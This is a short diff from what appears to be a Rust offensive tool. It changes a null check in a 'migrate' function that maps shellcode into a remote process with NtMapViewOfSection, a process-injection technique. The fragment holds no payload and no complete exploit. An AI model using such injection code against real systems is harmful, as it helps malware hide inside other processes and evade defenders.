@@ -206,7 +206,7 @@ pub unsafe fn migrate(shellcode: &[u8], process_handle: HANDLE, target_pid: usiz
     // Section handle is not longer needed
     nt::nt_close(section_handle);
 
-    if status != STATUS_SUCCESS || local_view.is_null() {
+    if status != STATUS_SUCCESS || remote_shellcode.is_null() {
         debug!("[POOL] NtMapViewOfSection (remote RW) failed: 0x{:08X}", status);
         return false;
     }
